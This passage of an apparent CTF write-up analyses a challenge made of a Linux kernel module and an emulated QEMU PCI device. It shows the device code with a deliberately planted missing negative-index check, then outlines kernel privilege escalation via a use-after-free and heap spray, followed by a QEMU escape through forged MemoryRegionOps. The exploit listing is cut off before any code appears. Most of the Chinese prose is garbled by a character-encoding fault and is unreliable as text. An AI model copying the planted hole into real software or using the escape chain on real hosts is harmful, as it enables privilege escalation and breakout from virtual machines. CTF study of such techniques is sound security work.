class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev</span> *<span class="hljs-title">dev</span> =</span> f-&gt;private_data;<br>    <span class="hljs-type">ssize_t</span> ret;<br>    <span class="hljs-type">ssize_t</span> wlen = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (bytedev_queue_full(dev)) &#123;<br>        ret = -EFAULT;<br>        <span class="hljs-keyword">goto</span> out;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (size &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev_data</span> *<span class="hljs-title">d</span>;</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> left, clen;<br>        <span class="hljs-type">int</span> d_idx;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * If the data queue is already full,</span><br><span class="hljs-comment">         * just quit out is OK.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">if</span> (bytedev_queue_full(dev)) &#123;<br>            ret = wlen;<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * Fill the unused part of last buffer.</span><br><span class="hljs-comment">         * We mainly fill the data that is less than BYTEDEV_BUF_SIZE there.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">if</span> (bytedev_queue_last_empty(dev)) &#123;<br>            <span class="hljs-type">int</span> d_idx = <br>                    (dev-&gt;tail_idx - <span class="hljs-number">1</span> + BYTEDEV_MAX_BUFS) % BYTEDEV_MAX_BUFS;<br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev_data</span> *<span class="hljs-title">d</span> =</span> dev-&gt;data_queue[d_idx];<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> left = BYTEDEV_BUF_SIZE - d-&gt;len;<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> clen = left &gt; size ? size : left;<br><br>            ret = copy_from_user(&amp;d-&gt;data[d-&gt;len], buf + wlen, clen);<br>            <span class="hljs-keyword">if</span> (ret) &#123;<br>                printk(KERN_ERR <span class="hljs-string">&quot;[bytedev:] failed while writing the buffer!&quot;</span>);<br>                <span class="hljs-keyword">goto</span> out;<br>            &#125;<br><br>            size -= clen;<br>            d-&gt;len += clen;<br>            wlen += clen;<br><br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * When we arrive at there, it means that there&#x27;s no space left</span><br><span class="hljs-comment">         * on the tail buffer, so we alloc a new buffer there.</span><br><span class="hljs-comment">         */</span><br>        d_idx = dev-&gt;tail_idx;<br>        dev-&gt;data_queue[d_idx] = <br>                    kmalloc(BYTEDEV_BUF_SIZE + <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> bytedev_data), <br>                            GFP_KERNEL_ACCOUNT);<br>        dev-&gt;tail_idx++;<br>        dev-&gt;tail_idx %= BYTEDEV_MAX_BUFS;<br><br>        d = dev-&gt;data_queue[d_idx];<br>        d-&gt;len = <span class="hljs-number">0</span>;<br>        d-&gt;offset = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-comment">/* Copy the data there */</span><br>        left = BYTEDEV_BUF_SIZE;<br>        clen = left &gt; size ? size : left;<br><br>        ret = copy_from_user(&amp;d-&gt;data[d-&gt;len], buf + wlen, clen);<br>        <span class="hljs-keyword">if</span> (ret) &#123;<br>            printk(KERN_ERR <span class="hljs-string">&quot;[bytedev:] failed while writing the buffer!&quot;</span>);<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br><br>        size -= clen;<br>        d-&gt;len += clen;<br>        wlen += clen;<br>    &#125;<br><br>    ret = wlen;<br><br>out:<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="äºŒã€QEMU-è®¾å¤‡éƒ¨åˆ†">äºŒã€QEMU è®¾å¤‡éƒ¨åˆ†</h2><p>ç¬¬äºŒé˜¶æ®µåˆ™æ˜¯å¯¹è®¾å¤‡ block æ¨¡å¼ä¸‹çš„åº”ç”¨ï¼Œè¿™é‡Œ QEMU æ¨¡æ‹Ÿäº†ä¸€ä¸ªç±»ä¼¼äºç¡¬ç›˜çš„è®¾å¤‡ï¼Œæˆ‘ä»¬å¯ä»¥è¯»å†™æŒ‡å®šçš„æ‰‡åŒºï¼ˆå¤§å°ä¸º 512 å­—èŠ‚ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> BYTEDEV_SECTOR_SIZE 512</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BYTEDEV_SECTOR_NUM 256</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BYTEPCIDevRegs</span> &#123;</span><br>    <span class="hljs-type">int</span> mode;<br>    <span class="hljs-type">int</span> blk_idx;<br>    <span class="hljs-type">int</span> blk_status;<br>&#125; BYTEPCIDevRegs;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BYTEPCIDevState</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    PCIDevice parent_obj;<br><br>    <span class="hljs-comment">/*&lt; public &gt;*/</span><br>    BYTEPCIDevRegs regs;<br><br>    MemoryRegion mmio;<br>    MemoryRegion pmio;<br><br>    <span class="hljs-type">char</span> *blk_mem[BYTEDEV_SECTOR_NUM];<br>&#125; BYTEPCIDevState;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­æˆ‘ä»¬ä½¿ç”¨ PMIO æ¥å®ç°è®¾å¤‡æ¨¡å¼çš„è·å–ä¸åˆ‡æ¢ã€æ‰‡åŒºçš„åˆ‡æ¢ï¼Œä½¿ç”¨ MMIO æ¥å®ç°å¯¹ç‰¹å®šæ‰‡åŒºçš„è¯»å†™ï¼Œè€Œæ¼æ´ä¾¿å‡ºåœ¨æ‰‡åŒºçš„åˆ‡æ¢ä¸Šï¼Œè™½ç„¶è®¾å¤‡é‡Œæœ‰ä¸€ä¸ªåå‘çš„æ‰‡åŒºç´¢å¼•è¶Šç•Œæ£€æŸ¥ï¼Œä½†æ˜¯å­˜å‚¨å½“å‰æ‰‡åŒºç´¢å¼•æ‰€ä½¿ç”¨çš„ä¸º int ç±»å‹çš„å˜é‡ï¼Œ<strong>è€Œè®¾å¤‡ä»£ç ä¸­å¹¶æ²¡æœ‰å¯¹ç´¢å¼•ä¸ºè´Ÿæ•°çš„æƒ…å†µè¿›è¡Œæ£€æŸ¥</strong>ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è¿›è¡Œå‰å‘çš„è¶Šç•Œæ“ä½œï¼Œè‹¥æ˜¯åœ¨ä½åœ°å€å¤„å­˜åœ¨å¯åˆ©ç”¨çš„æŒ‡é’ˆåˆ™å¯ä»¥ç›´æ¥å®Œæˆè¶Šç•Œçš„è¯»å†™æ“ä½œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">byte_dev_pmio_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    BYTEPCIDevState *ds = BYTEDEV_PCI(opaque);<br>    <span class="hljs-type">int</span> op_idx = val;<br><br>    <span class="hljs-keyword">if</span> (size != <span class="hljs-number">4</span>) &#123;<br>        <span class="hljs-keyword">return</span> ;<br>    &#125;<br><br>    smp_mb();<br><br>    <span class="hljs-keyword">switch</span> (addr) &#123;<br>        <span class="hljs-keyword">case</span> BYTEDEV_REG_MODE:<br>            <span class="hljs-keyword">switch</span> (val) &#123;<br>                <span class="hljs-keyword">case</span> BYTEDEV_MODE_BLK:<br>                <span class="hljs-keyword">case</span> BYTEDEV_MODE_STREAM:<br>                    ds-&gt;regs.mode = val;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-keyword">return</span> ;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> BYTEDEV_REG_BLK_IDX:<br>            <span class="hljs-keyword">if</span> (ds-&gt;regs.blk_status == BYTEDEV_BLK_STATUS_BUSY) &#123;<br>                <span class="hljs-keyword">return</span> ;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (ds-&gt;regs.mode != BYTEDEV_MODE_BLK) &#123;<br>                <span class="hljs-keyword">return</span> ;<br>            &#125;<br>            <span class="hljs-comment">/** </span><br><span class="hljs-comment">             * There&#x27;s where we made our basic bug: OOB rw forward </span><br><span class="hljs-comment">             * Because there&#x27;s no check for minus idx there.</span><br><span class="hljs-comment">             * */</span><br>            <span class="hljs-keyword">if</span> (op_idx &gt;= BYTEDEV_SECTOR_NUM) &#123;<br>                <span class="hljs-keyword">return</span> ;<br>            &#125;<br><br>            ds-&gt;regs.blk_idx = op_idx;<br>            ds-&gt;regs.blk_status = BYTEDEV_BLK_STATUS_BUSY;<br>            <span class="hljs-keyword">if</span> (!ds-&gt;blk_mem[ds-&gt;regs.blk_idx]) &#123;<br>                ds-&gt;blk_mem[ds-&gt;regs.blk_idx] = g_malloc(BYTEDEV_SECTOR_SIZE);<br>            &#125;<br>            ds-&gt;regs.blk_status = BYTEDEV_BLK_STATUS_READY;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h1>0x02.æ¼æ´åˆ©ç”¨</h1><p>æ¼æ´çš„åˆ©ç”¨å­˜åœ¨ä¸¤ä¸ªé˜¶æ®µï¼šç¬¬ä¸€é˜¶æ®µæ˜¯åˆ©ç”¨å†…æ ¸æ¨¡å—ä¸­æµæ¨¡å¼å­˜åœ¨çš„æ¼æ´å®Œæˆææƒï¼Œç¬¬äºŒé˜¶æ®µåˆ™æ˜¯åˆ©ç”¨æ¨¡æ‹Ÿè®¾å¤‡ä¸­å­˜åœ¨çš„æ¼æ´å®Œæˆè™šæ‹ŸåŒ–é€ƒé€¸</p><h2 id="Stage-I-kernel-primitive">Stage.I - kernel primitive</h2><p>ç”±äºæˆ‘ä»¬ç›´æ¥æœ‰ UAF å’Œè¶Šç•Œè¯»å†™ï¼Œé‚£ä¹ˆç¬¬ä¸€é˜¶æ®µçš„è§£é¢˜æ€è·¯å°±æ¯”è¾ƒæ¸…æ™°äº†ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆå†™å…¥ä¸€ä¸ª buffer åè¯»å–å‡ºè¯¥ buffer åˆ¶é€ å‡º UAFï¼Œä¹‹ååˆ©ç”¨å…¶ä»–ç»“æ„ä½“æ”¹å†™å…¶æ•°æ®ç»Ÿè®¡å­—æ®µï¼Œä¹‹åå†é€šè¿‡è¶Šç•Œå†™è¿›è¡Œææƒï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ç”±äºå¼€å¯äº† hardened usercopy æ£€æŸ¥ï¼Œæˆ‘ä»¬éœ€è¦ç›´æ¥åœ¨ä¸‹ä¸€ä¸ª object ä¸­è¿›è¡Œæ•°æ®å†™å…¥ï¼Œè€Œä¸èƒ½è¿›è¡Œè·¨ object çš„æ•°æ®æ‹·è´</p><p>ç”±äºåˆ†é… buffer æ‰€ç”¨çš„ flag ä¸º GFP_KERNEL_ACCOUNTï¼Œå› æ­¤æœ€åçš„ææƒè§£æ³•ç›´æ¥å¥—ç”¨ CVE-2021-22555 çš„å †å–· msg_msg + sk_buff çš„æ¨¡æ¿å³å¯</p><h2 id="Stage-II-QEMU-escape">Stage.II - QEMU escape</h2><p>ç”±äºè¯»å†™è¿‡ç¨‹ä¸ºé€šè¿‡å¯¹åº”ç´¢å¼•çš„æŒ‡é’ˆå®Œæˆè¯»å†™ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å‘å‰å¯»æ‰¾æŒ‡å‘åˆé€‚åŒºåŸŸçš„æŒ‡é’ˆæ¥å®ç°åˆ©ç”¨ï¼Œä¸‡å¹¸çš„æ˜¯æˆ‘ä»¬å‰å‘å¯è¯»çš„åŒºåŸŸä¸­æœ‰ MemoryRegionï¼Œè¿˜æœ‰è®¾å¤‡ç»“æ„ä½“çš„çˆ¶ç±» PCIDevice ï¼š</p><p>åˆ©ç”¨ MemoryRegion æˆ‘ä»¬å¯ä»¥æ³„éœ²å‡ºè®¾å¤‡è‡ªèº«ç»“æ„ä½“çš„åœ°å€å¹¶è¯»å†™å¼€å¤´çš„ 512 å­—èŠ‚ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å…¶ io_regions ä¸­çš„ç©ºé—²å­—æ®µæ„é€  ROP æˆ–æ˜¯ä¸€äº›å…¶ä»–ä¸œè¥¿</p><p>å¯¹äº PCIDevice æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æœ€ä¸Šå±‚çš„çˆ¶ç±» Object çš„ properties æˆå‘˜æ³„éœ²å‡º glib çš„åŸºåœ°å€ï¼Œä»è€Œæ³„éœ²å‡º glibc çš„åŸºåœ°å€ï¼ˆå…¶åŠ è½½åœ°å€é—´åç§»å›ºå®šï¼‰ï¼›åŒæ—¶æˆ‘ä»¬è¿˜èƒ½é€šè¿‡å…¶ io_regions å­—æ®µå®Œæˆå¯¹ MemoryRegion çš„è¯»å†™</p><p>é‚£ä¹ˆæ•´ä¸ªåˆ©ç”¨æ€è·¯å°±éå¸¸æ¸…æ™°äº†ï¼šæˆ‘ä»¬å…ˆå‰å‘è¯»å– properties æ³„éœ²å‡º libcï¼Œä¹‹åè¯»å– MemoryRegion æ³„éœ²å‡ºè®¾å¤‡ç»“æ„ä½“åœ°å€ï¼Œåœ¨ PCIDevice.io_regions ä¸Šæ„é€  fake MemoryRegionOps ååŠ«æŒ PMIO çš„ MemoryRegion çš„ ops ä»è€Œå®Œæˆè™šæ‹Ÿæœºé€ƒé€¸</p><h2 id="FINAL-EXPLOIT">FINAL EXPLOIT</h2><p>æœ€ç»ˆçš„ exp å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span 